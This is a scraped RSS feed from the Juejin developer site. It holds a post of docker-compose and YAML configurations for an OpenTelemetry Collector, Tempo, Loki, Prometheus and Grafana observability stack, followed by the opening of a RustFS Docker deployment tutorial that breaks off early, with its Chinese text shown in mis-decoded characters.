<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>æ˜é‡‘æ–‡ç« æ¨è</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>ä¸€ä¸ªå¸®åŠ©å¼€å‘è€…æˆé•¿çš„ç¤¾åŒº</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[otel-collectorå…¨å®¶æ¡¶]]></title>    <link>https://juejin.cn/post/7592992745573220390</link>    <guid>https://juejin.cn/post/7592992745573220390</guid>    <pubDate>2026-01-09T03:31:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592992745573220390" data-draft-id="7592996072704933938" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="otel-collectorå…¨å®¶æ¡¶"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-09T03:31:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ChildrenGreens"/> <meta itemprop="url" content="https://juejin.cn/user/3672804335299773"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            otel-collectorå…¨å®¶æ¡¶
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3672804335299773/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ChildrenGreens
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T03:31:58.000Z" title="Fri Jan 09 2026 03:31:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>docker-compose.yml</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">"3.9"</span>

<span class="hljs-attr">services:</span>
  <span class="hljs-attr">tempo:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">grafana/tempo:latest</span>
    <span class="hljs-attr">container_name:</span> <span class="hljs-string">tempo</span>
    <span class="hljs-attr">command:</span> [<span class="hljs-string">"-config.file=/etc/tempo/tempo.yaml"</span>]
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./tempo.yaml:/etc/tempo/tempo.yaml:ro</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"3200:3200"</span>    <span class="hljs-comment"># Grafana è®¿é—® Tempo HTTP</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"4317:4317"</span>    <span class="hljs-comment"># OTLP gRPCï¼ˆç»™å¤–éƒ¨ç”¨å¯é€‰ï¼Œä½†ç•™ç€ä¹Ÿæ²¡åå¤„ï¼‰</span>

  <span class="hljs-attr">otel-collector:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">otel/opentelemetry-collector:0.140.1</span>
    <span class="hljs-attr">container_name:</span> <span class="hljs-string">otel-collector</span>
    <span class="hljs-attr">command:</span> [<span class="hljs-string">"--config=/etc/otelcol/config.yaml"</span>]
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./otel-collector.yaml:/etc/otelcol/config.yaml:ro</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"4318:4318"</span>    <span class="hljs-comment"># Spring Boot OTLP HTTP</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"9464:9464"</span>    <span class="hljs-comment"># Prometheus scrape</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"13133:13133"</span>  <span class="hljs-comment"># å¥åº·æ£€æŸ¥ï¼ˆå¯é€‰ï¼‰</span>
    <span class="hljs-attr">depends_on:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">tempo</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">loki</span>

  <span class="hljs-attr">loki:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">grafana/loki:2.9.0</span>
    <span class="hljs-attr">container_name:</span> <span class="hljs-string">loki</span>
    <span class="hljs-attr">user:</span> <span class="hljs-string">"0"</span>   <span class="hljs-comment"># ğŸ‘ˆ å…³é”®ï¼šä»¥ root ç”¨æˆ·è¿è¡Œï¼Œé¿å…æƒé™é—®é¢˜</span>
    <span class="hljs-attr">command:</span> [<span class="hljs-string">"-config.file=/etc/loki/loki-config.yaml"</span>]
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./loki-config.yaml:/etc/loki/loki-config.yaml:ro</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">loki-data:/loki</span>          <span class="hljs-comment"># ğŸ‘ˆ æ–°å¢ï¼šå®¿ä¸»æœºç›®å½•æŒ‚åˆ° /loki</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"3100:3100"</span>

  <span class="hljs-attr">prometheus:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">prom/prometheus:latest</span>
    <span class="hljs-attr">container_name:</span> <span class="hljs-string">prometheus</span>
    <span class="hljs-attr">command:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"--config.file=/etc/prometheus/prometheus.yml"</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./prometheus.yml:/etc/prometheus/prometheus.yml:ro</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"9090:9090"</span>
    <span class="hljs-attr">depends_on:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">otel-collector</span>

  <span class="hljs-attr">grafana:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">grafana/grafana:latest</span>
    <span class="hljs-attr">container_name:</span> <span class="hljs-string">grafana</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"3000:3000"</span>
    <span class="hljs-attr">depends_on:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">prometheus</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">tempo</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">loki</span>

<span class="hljs-attr">volumes:</span>
  <span class="hljs-attr">loki-data:</span> {}

</code></pre>
<p>tempo.yaml</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">server:</span>
  <span class="hljs-attr">http_listen_port:</span> <span class="hljs-number">3200</span>
  <span class="hljs-attr">grpc_listen_port:</span> <span class="hljs-number">9095</span>        <span class="hljs-comment"># Tempo å†…éƒ¨ gRPCï¼Œç”¨é»˜è®¤ç«¯å£</span>

<span class="hljs-attr">distributor:</span>
  <span class="hljs-attr">receivers:</span>
    <span class="hljs-attr">otlp:</span>
      <span class="hljs-attr">protocols:</span>
        <span class="hljs-attr">grpc:</span>
          <span class="hljs-attr">endpoint:</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-string">:4317</span>   <span class="hljs-comment"># â­ OTLP gRPC åœ¨å®¹å™¨å†…ç›‘å¬ 4317</span>

<span class="hljs-attr">storage:</span>
  <span class="hljs-attr">trace:</span>
    <span class="hljs-attr">backend:</span> <span class="hljs-string">local</span>
    <span class="hljs-attr">wal:</span>
      <span class="hljs-attr">path:</span> <span class="hljs-string">/tmp/tempo/wal</span>
    <span class="hljs-attr">local:</span>
      <span class="hljs-attr">path:</span> <span class="hljs-string">/tmp/tempo/blocks</span>

<span class="hljs-attr">compactor:</span>
  <span class="hljs-attr">compaction:</span>
    <span class="hljs-attr">compaction_window:</span> <span class="hljs-string">1h</span>
    <span class="hljs-attr">block_retention:</span> <span class="hljs-string">24h</span>
    <span class="hljs-attr">compacted_block_retention:</span> <span class="hljs-string">24h</span>
</code></pre>
<p>loki-config.yaml</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">auth_enabled:</span> <span class="hljs-literal">false</span>

<span class="hljs-attr">server:</span>
  <span class="hljs-attr">http_listen_port:</span> <span class="hljs-number">3100</span>
  <span class="hljs-attr">grpc_listen_port:</span> <span class="hljs-number">9096</span>

<span class="hljs-attr">ingester:</span>
  <span class="hljs-attr">wal:</span>
    <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span>
    <span class="hljs-attr">dir:</span> <span class="hljs-string">/loki/wal</span>          <span class="hljs-comment"># ğŸ‘ˆ WAL æ”¾åœ¨ /loki ä¸‹é¢ï¼ŒæŒ‚äº† volume å°±ä¸ä¼šæƒé™é—®é¢˜</span>
  <span class="hljs-attr">lifecycler:</span>
    <span class="hljs-attr">address:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>
    <span class="hljs-attr">ring:</span>
      <span class="hljs-attr">kvstore:</span>
        <span class="hljs-attr">store:</span> <span class="hljs-string">inmemory</span>
      <span class="hljs-attr">replication_factor:</span> <span class="hljs-number">1</span>
    <span class="hljs-attr">final_sleep:</span> <span class="hljs-string">0s</span>
  <span class="hljs-attr">chunk_idle_period:</span> <span class="hljs-string">3m</span>
  <span class="hljs-attr">max_chunk_age:</span> <span class="hljs-string">1h</span>
  <span class="hljs-attr">chunk_target_size:</span> <span class="hljs-number">1048576</span>
  <span class="hljs-attr">max_transfer_retries:</span> <span class="hljs-number">0</span>

<span class="hljs-attr">schema_config:</span>
  <span class="hljs-attr">configs:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">from:</span> <span class="hljs-number">2020-10-24</span>
      <span class="hljs-attr">store:</span> <span class="hljs-string">boltdb-shipper</span>
      <span class="hljs-attr">object_store:</span> <span class="hljs-string">filesystem</span>
      <span class="hljs-attr">schema:</span> <span class="hljs-string">v11</span>
      <span class="hljs-attr">index:</span>
        <span class="hljs-attr">prefix:</span> <span class="hljs-string">index_</span>
        <span class="hljs-attr">period:</span> <span class="hljs-string">24h</span>

<span class="hljs-attr">storage_config:</span>
  <span class="hljs-attr">boltdb_shipper:</span>
    <span class="hljs-attr">active_index_directory:</span> <span class="hljs-string">/loki/index</span>
    <span class="hljs-attr">cache_location:</span> <span class="hljs-string">/loki/cache</span>
    <span class="hljs-attr">shared_store:</span> <span class="hljs-string">filesystem</span>
  <span class="hljs-attr">filesystem:</span>
    <span class="hljs-attr">directory:</span> <span class="hljs-string">/loki/chunks</span>     <span class="hljs-comment"># ğŸ‘ˆ æ•°æ®å—ç›®å½•ï¼ŒåŒæ ·åœ¨ /loki ä¸‹é¢</span>

<span class="hljs-attr">compactor:</span>
  <span class="hljs-attr">working_directory:</span> <span class="hljs-string">/loki/compactor</span>
  <span class="hljs-attr">shared_store:</span> <span class="hljs-string">filesystem</span>
  <span class="hljs-attr">compaction_interval:</span> <span class="hljs-string">10m</span>

<span class="hljs-attr">limits_config:</span>
  <span class="hljs-attr">allow_structured_metadata:</span> <span class="hljs-literal">true</span>
  <span class="hljs-attr">enforce_metric_name:</span> <span class="hljs-literal">false</span>
  <span class="hljs-attr">reject_old_samples:</span> <span class="hljs-literal">true</span>
  <span class="hljs-attr">reject_old_samples_max_age:</span> <span class="hljs-string">168h</span>
  <span class="hljs-attr">max_streams_per_user:</span> <span class="hljs-number">0</span>
  <span class="hljs-attr">max_global_streams_per_user:</span> <span class="hljs-number">0</span>

<span class="hljs-attr">query_range:</span>
  <span class="hljs-attr">parallelise_shardable_queries:</span> <span class="hljs-literal">true</span>
  <span class="hljs-attr">align_queries_with_step:</span> <span class="hljs-literal">true</span>
  <span class="hljs-attr">cache_results:</span> <span class="hljs-literal">true</span>
  <span class="hljs-attr">max_retries:</span> <span class="hljs-number">5</span>

<span class="hljs-attr">querier:</span>
  <span class="hljs-attr">engine:</span>
    <span class="hljs-attr">max_look_back_period:</span> <span class="hljs-string">0s</span>
  <span class="hljs-attr">query_timeout:</span> <span class="hljs-string">1m</span>

</code></pre>
<p>otel-collector.yaml</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">receivers:</span>
  <span class="hljs-attr">otlp:</span>
    <span class="hljs-attr">protocols:</span>
      <span class="hljs-attr">http:</span>
        <span class="hljs-attr">endpoint:</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-string">:4318</span>   <span class="hljs-comment"># HTTP OTLPï¼Œç»™ Spring Boot ç”¨</span>
      <span class="hljs-attr">grpc:</span>
        <span class="hljs-attr">endpoint:</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-string">:4317</span>   <span class="hljs-comment"># gRPC OTLPï¼ˆå¯é€‰ï¼‰</span>

<span class="hljs-attr">exporters:</span>
  <span class="hljs-attr">prometheus:</span>
    <span class="hljs-attr">endpoint:</span> <span class="hljs-string">"0.0.0.0:9464"</span>
    <span class="hljs-attr">namespace:</span> <span class="hljs-string">"myapp"</span>

  <span class="hljs-attr">otlp/tempo:</span>
    <span class="hljs-attr">endpoint:</span> <span class="hljs-string">"tempo:4317"</span>      <span class="hljs-comment"># â­ å‘ gRPC åˆ° Tempo</span>
    <span class="hljs-attr">tls:</span>
      <span class="hljs-attr">insecure:</span> <span class="hljs-literal">true</span>

  <span class="hljs-attr">otlphttp/logs:</span>
    <span class="hljs-attr">endpoint:</span> <span class="hljs-string">"http://loki:3100/otlp"</span>
    <span class="hljs-attr">tls:</span>
      <span class="hljs-attr">insecure:</span> <span class="hljs-literal">true</span>

<span class="hljs-attr">processors:</span>
  <span class="hljs-attr">batch:</span>
    <span class="hljs-attr">timeout:</span> <span class="hljs-string">5s</span>
    <span class="hljs-attr">send_batch_size:</span> <span class="hljs-number">1000</span>

<span class="hljs-attr">service:</span>
  <span class="hljs-attr">pipelines:</span>
    <span class="hljs-attr">metrics:</span>
      <span class="hljs-attr">receivers:</span> [<span class="hljs-string">otlp</span>]
      <span class="hljs-attr">processors:</span> [<span class="hljs-string">batch</span>]
      <span class="hljs-attr">exporters:</span> [<span class="hljs-string">prometheus</span>]

    <span class="hljs-attr">traces:</span>
      <span class="hljs-attr">receivers:</span> [<span class="hljs-string">otlp</span>]
      <span class="hljs-attr">processors:</span> [<span class="hljs-string">batch</span>]
      <span class="hljs-attr">exporters:</span> [<span class="hljs-string">otlp/tempo</span>]

    <span class="hljs-attr">logs:</span>
      <span class="hljs-attr">receivers:</span> [<span class="hljs-string">otlp</span>]
      <span class="hljs-attr">processors:</span> [<span class="hljs-string">batch</span>]
      <span class="hljs-attr">exporters:</span> [<span class="hljs-string">otlphttp/logs</span>]

</code></pre>
<p>prometheus.yml</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">global:</span>
  <span class="hljs-attr">scrape_interval:</span> <span class="hljs-string">10s</span>

<span class="hljs-attr">scrape_configs:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">job_name:</span> <span class="hljs-string">'otel-collector'</span>
    <span class="hljs-attr">static_configs:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">targets:</span> [<span class="hljs-string">'otel-collector:9464'</span>]

</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ‰‹æŠŠæ‰‹æ•™ä½ ç”¨Dockeréƒ¨ç½²RustFSï¼š3æ­¥æ­å»ºS3å…¼å®¹å­˜å‚¨ï¼ˆCentOSï¼Ubuntué€šç”¨ï¼Œé™„é¿å‘æŒ‡å—ï¼‰]]></title>    <link>https://juejin.cn/post/7592846242176974882</link>    <guid>https://juejin.cn/post/7592846242176974882</guid>    <pubDate>2026-01-09T04:29:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592846242176974882" data-draft-id="7592853243732115496" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ‰‹æŠŠæ‰‹æ•™ä½ ç”¨Dockeréƒ¨ç½²RustFSï¼š3æ­¥æ­å»ºS3å…¼å®¹å­˜å‚¨ï¼ˆCentOSï¼Ubuntué€šç”¨ï¼Œé™„é¿å‘æŒ‡å—ï¼‰"/> <!----> <meta itemprop="datePublished" content="2026-01-09T04:29:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¯¹è±¡å­˜å‚¨ä¸RustFS"/> <meta itemprop="url" content="https://juejin.cn/user/652466093570057"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ‰‹æŠŠæ‰‹æ•™ä½ ç”¨Dockeréƒ¨ç½²RustFSï¼š3æ­¥æ­å»ºS3å…¼å®¹å­˜å‚¨ï¼ˆCentOSï¼Ubuntué€šç”¨ï¼Œé™„é¿å‘æŒ‡å—ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/652466093570057/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¯¹è±¡å­˜å‚¨ä¸RustFS
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T04:29:45.000Z" title="Fri Jan 09 2026 04:29:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">æ‰‹æŠŠæ‰‹æ•™ä½ ç”¨Dockeréƒ¨ç½²RustFSï¼š3æ­¥æ­å»ºS3å…¼å®¹å­˜å‚¨ï¼ˆCentOSï¼Ubuntué€šç”¨ï¼Œé™„é¿å‘æŒ‡å—ï¼‰</h2>
<h3 data-id="heading-1">ä¸€ã€ä¸ºä»€ä¹ˆé€‰RustFS+Dockerï¼Ÿ</h3>
<p>ä¸Šå‘¨å¸®æœ‹å‹çš„è€ç‰Œåˆ¶é€ ä¸šä¼ä¸šæ­å»ºæ•°æ®æ¹–æ—¶ï¼Œä»–ä»¬æäº†ä¸‰ä¸ªâ€œçµé­‚æ‹·é—®â€ï¼š</p>
<ol>
<li>èƒ½ä¸èƒ½ç”¨æœ€å°‘çš„é’±æå®š100TBå­˜å‚¨ï¼Ÿ</li>
